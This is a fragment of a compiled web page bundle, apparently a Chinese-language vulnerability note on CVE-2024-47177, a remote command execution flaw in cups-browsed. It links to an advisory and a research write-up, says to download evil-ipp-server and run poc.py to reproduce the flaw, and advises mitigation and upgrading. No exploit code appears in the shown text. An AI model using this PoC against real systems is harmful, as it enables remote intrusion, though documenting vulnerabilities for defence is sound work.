class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,2),E={href:"https://github.com/OpenPrinting/cups-browsed/releases",target:"_blank",rel:"noopener noreferrer"};function w(P,S){const a=i("ExternalLinkIcon");return o(),c("div",null,[l,r,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/"),t(a)])]),n("li",null,[n("a",m,[s("https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8"),t(a)])])]),b,n("p",null,[s("首先，下载 "),n("a",g,[s("evil-ipp-server"),t(a)]),s(" 项目并运行 "),n("a",_,[s("poc.py"),t(a)]),s(":")]),h,n("p",null,[n("a",y,[s("poc.py"),t(a)])]),f,n("p",null,[s("目前上述漏洞暂无相应补丁，受影响用户可应用相关缓解措施并在安全更新发布后升级到最新版本。下载链接： "),n("a",E,[s("https://github.com/OpenPrinting/cups-browsed/releases"),t(a)])])])}const q=e(u,[["render",w],["__file","OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞 CVE-2024-47177.html.vue"]]);export{q as default};
